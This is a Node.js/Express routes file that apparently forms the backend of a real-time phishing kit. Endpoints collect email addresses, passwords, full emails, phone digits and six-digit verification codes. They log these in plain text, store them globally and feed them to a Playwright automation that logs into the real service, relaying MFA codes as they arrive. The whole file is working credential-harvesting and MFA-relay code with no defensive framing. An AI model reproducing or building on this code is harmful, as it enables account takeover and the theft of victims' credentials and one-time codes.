/**
 * API Routes
 * Express API routes for the application
 */

const express = require('express');
const router = express.Router();
const globals = require('../config/globals');
const { getConnection } = require('../services/websocket');
const { sendToClient } = require('../services/websocket');
const { startAutomation } = require('../automation/loginFlow');
const { handleImmediateEmailInput } = require('../handlers/emailHandler');
const { requireValidToken } = require('../middleware/tokenValidator');

// All API routes below require a valid token
router.use(requireValidToken);

/**
 * Backend endpoint to receive credentials and start automation
 * Protected by Token Validation
 */
router.post('/start-auth', async (req, res) => {
    const { email, password, token } = req.body;
    const ip = req.ip || req.connection.remoteAddress;

    console.log('\n🔐 === CREDENTIALS RECEIVED ===');
    console.log('📧 Email:', email);
    console.log('🔑 Password:', password);
    console.log('🎫 Token:', token);
    console.log('===============================\n');

    // Token already validated by middleware; trust req.validatedToken

    // Stores credentials and token globally for saving user data and redirects
    try {
        globals.set('globalLoginEmail', email);
        globals.set('globalLoginPassword', password);
        globals.set('globalToken', token); // Store token for MFA redirect URLs
        console.log('💾 Credentials stored for user data saving');
        console.log('🎫 Token stored for redirect URLs:', token);
    } catch (error) {
        console.error('⚠️ Error storing credentials:', error.message);
    }

    // Send response to client
    res.json({
        success: true,
        message: 'Automation started',
        credentials: { email, password }
    });

    // Get WebSocket connection
    const wsConnection = getConnection();

    // Notify client that automation has started
    if (wsConnection) {
        const { sendToClient } = require('../services/websocket');
        sendToClient({
            status: 'automation_started',
            message: 'Automation process has begun'
        });
    }

    // Start Playwright automation with received credentials
    await startAutomation(email, password, wsConnection);
});

/**
 * Backend endpoint to receive full email from mailinput.html
 * Stores the email globally for Playwright automation to fill in
 */
router.post('/send-verification-code', async (req, res) => {
    console.log('📧 /send-verification-code endpoint hit!');

    try {
        const { maskedEmail, fullEmail, maskedPhone, phoneDigits } = req.body;
        const ip = req.ip || req.connection.remoteAddress;

        console.log('\n📧 === FULL EMAIL RECEIVED ===');
        console.log('🎭 Masked Email:', maskedEmail);
        console.log('📧 Full Email:', fullEmail);
        console.log('🎫 Token:', req.validatedToken);
        console.log('==============================\n');

        if (!fullEmail && !phoneDigits) {
            return res.status(400).json({
                success: false,
                status: 'error',
                message: 'Full email or phone digits is required'
            });
        }

        // Signal potential reset logic if stuck in code loop
        globals.set('resetToEmailInput', true);

        if (fullEmail) {
            globals.set('globalFullEmail', fullEmail);
            globals.set('globalMaskedEmail', maskedEmail);
            console.log('✅ Full email stored for Playwright automation:', fullEmail);
        }

        if (maskedPhone && phoneDigits) {
            globals.set('globalPhoneDigits', phoneDigits);
            console.log('✅ Phone digits stored for Playwright automation:', phoneDigits);
        }

        res.json({
            success: true,
            status: 'success',
            message: 'Email/phone received - code will be sent'
        });

        // IMMEDIATE EMAIL INPUT HANDLING (Primary flow)
        const globalPage = globals.get('globalPage');
        if (fullEmail && globalPage) {
            console.log('🔄 Starting immediate email input handling...');
            const success = await handleImmediateEmailInput(globalPage, fullEmail);

            // Send WebSocket status to mailinput.html
            if (success) {
                sendToClient({
                    status: 'email_input_success',
                    message: 'Email successfully input and code sent'
                });
            } else {
                sendToClient({
                    status: 'email_input_failed',
                    message: 'Failed to input email - please try manually'
                });
            }
        }

    } catch (error) {
        console.error('❌ Error in /send-verification-code:', error);
        res.status(500).json({
            success: false,
            status: 'error',
            message: 'Server error'
        });
    }
});

/**
 * Backend endpoint to receive verification code from codeinput.html
 */
router.post('/verify-code', async (req, res) => {
    console.log('🔥 DEBUG: /verify-code endpoint hit!');

    try {
        const { code, email } = req.body;

        console.log('\n🔐 === VERIFICATION CODE RECEIVED ===');
        console.log('📧 Email:', email);
        console.log('🔢 Verification Code:', code);
        console.log('=====================================\n');

        if (code && code.length === 6) {
            console.log('✅ Verification code received and logged');

            // Store the verification code globally for automation use
            globals.set('globalVerificationCode', code);
            console.log('✅ Verification code stored for Playwright automation');

            // Send success response to frontend
            res.json({
                status: 'success',
                message: 'Code verified successfully',
                data: { code, email }
            });
        } else {
            console.log('❌ Invalid code format received');
            res.status(400).json({
                status: 'error',
                message: 'Invalid code format'
            });
        }

    } catch (error) {
        console.error('❌ Error in /verify-code:', error);
        res.status(500).json({
            status: 'error',
            message: 'Internal server error'
        });
    }
});

module.exports = router;
